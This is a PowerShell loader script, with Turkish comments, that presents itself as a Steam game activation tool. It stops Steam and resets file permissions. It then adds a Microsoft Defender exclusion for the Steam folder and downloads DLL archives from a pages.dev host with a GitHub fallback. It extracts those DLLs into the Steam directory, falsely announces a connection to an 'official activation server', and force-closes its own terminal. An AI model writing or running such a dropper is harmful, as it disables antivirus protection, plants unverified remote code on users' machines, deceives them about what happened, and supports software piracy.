cls

[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
$steamPath = ""

# --- Yardımcı Fonksiyonlar ---

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        Start-Process cmd -ArgumentList "/c icacls ""$path"" /reset /T /C" -WindowStyle Hidden -Wait
        Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$path""" -WindowStyle Hidden -Wait
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}

function ForceStopProcess($processName) {
    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
    }
}

# --- Başlangıç İşlemleri ---

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
if (Get-Process "steam" -ErrorAction SilentlyContinue) {
    CheckAndPromptProcess "Steam" "[Please exit Steam client first]"
}

# Steam Yolu Kontrolü
if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path $steamPath -PathType Container)) {
    Write-Host "Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# Eski DLL'leri temizle
Remove-ItemIfExists (Join-Path $steamPath "winhttp.dll")
Remove-ItemIfExists (Join-Path $steamPath "dwmapi.dll")
Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.dll")
Remove-ItemIfExists (Join-Path $steamPath "xinput1_4.dll")
Remove-ItemIfExists (Join-Path $steamPath "version.dll")
Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.dll")
Remove-ItemIfExists (Join-Path $steamPath "OpenSteamTool.dll")
Remove-ItemIfExists (Join-Path $steamPath "SYS_0xA7.toml")
Remove-ItemIfExists (Join-Path $steamPath "opensteamtool.toml")

# --- Ana Fonksiyon ---

function PwStart {
    param(
        [string]$githubBaseUrl = "https://github.com/WolfGames156/zdb2/raw/refs/heads/main"
    )

    try {
        if (!$steamPath) { return }

        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
        }

        # Steam yapılandırma temizliği
        Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
        Remove-ItemIfExists (Join-Path $steamPath "package\beta")
        Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")

        try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}

# --- SYS_0xA7.zip indir ve ayıkla ---
$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
if (!(Test-Path $gamesDataPath)) {
    New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue
}

$zipLocalSys = Join-Path $env:TEMP "Gamevia.zip"
$successSys = $false

# 1. Deneme: Ana Sunucu
try {
    Invoke-RestMethod -Uri "https://zdb2.pages.dev/Gamevia.zip" -OutFile $zipLocalSys -ErrorAction Stop
    $successSys = $true
} catch {
    Write-Host "Primary source for Gamevia.zip failed, trying fallback..." -ForegroundColor Yellow
}

# 2. Deneme: Fallback (GitHub)
if (-not $successSys) {
    try {
        Invoke-RestMethod -Uri "$githubBaseUrl/Gamevia.zip" -OutFile $zipLocalSys -ErrorAction Stop
        $successSys = $true
    } catch {
        Write-Host "Failed to download Gamevia.zip from both sources." -ForegroundColor Red
    }
}

if ($successSys -and (Test-Path $zipLocalSys)) {
    try {
        Expand-Archive -Path $zipLocalSys -DestinationPath $gamesDataPath -Force -ErrorAction Stop
        Write-Host "Gamevia.zip extracted successfully to $gamesDataPath." -ForegroundColor Green
    } catch {
        Write-Host "Failed to extract Gamevia.zip." -ForegroundColor Red
    }
    Remove-Item $zipLocalSys -Force -ErrorAction SilentlyContinue
}

        
        
        # dlls.zip indir ve ayıkla
        $zipLocal = Join-Path $env:TEMP "dlls.zip"
        $success = $false

        # 1. Deneme: Ana Sunucu
        try {
            Invoke-RestMethod -Uri "https://zdb2.pages.dev/dlls.zip" -OutFile $zipLocal -ErrorAction Stop
            $success = $true
        } catch {
            Write-Host "Primary source failed, trying fallback..." -ForegroundColor Yellow
        }

        # 2. Deneme: Fallback (GitHub)
        if (-not $success) {
            try {
                Invoke-RestMethod -Uri "$githubBaseUrl/dlls.zip" -OutFile $zipLocal -ErrorAction Stop
                $success = $true
            } catch {
                Write-Host "Failed to download dlls.zip from both sources." -ForegroundColor Red
            }
        }

        if ($success -and (Test-Path $zipLocal)) {
            try {
                Expand-Archive -Path $zipLocal -DestinationPath $steamPath -Force -ErrorAction Stop
                Write-Host "DLLs extracted successfully." -ForegroundColor Green
            } catch {
                Write-Host "Failed to extract dlls.zip." -ForegroundColor Red
            }
            Remove-Item $zipLocal -Force -ErrorAction SilentlyContinue
        }

        # Steam'i Başlat
        $steamExePath = Join-Path $steamPath "steam.exe"
        Start-Process $steamExePath
        Start-Process "steam://"

        Write-Host "[Successfully connected to official activation server. Please login to Steam to activate]" -ForegroundColor Green

        for ($i = 5; $i -ge 0; $i--) {
            Write-Host "`r[This window will close in $i seconds...]" -NoNewline
            Start-Sleep -Seconds 1
        }

        # Pencereyi kapat
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and ("powershell.exe", "WindowsTerminal.exe", "pwsh.exe" -contains $instance.ProcessName)) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }

        exit
    } catch {
        Write-Host "An unexpected error occurred." -ForegroundColor Red
    }
}

# Scripti Çalıştır
PwStart -githubBaseUrl "https://github.com/WolfGames156/zdb2/raw/refs/heads/main"
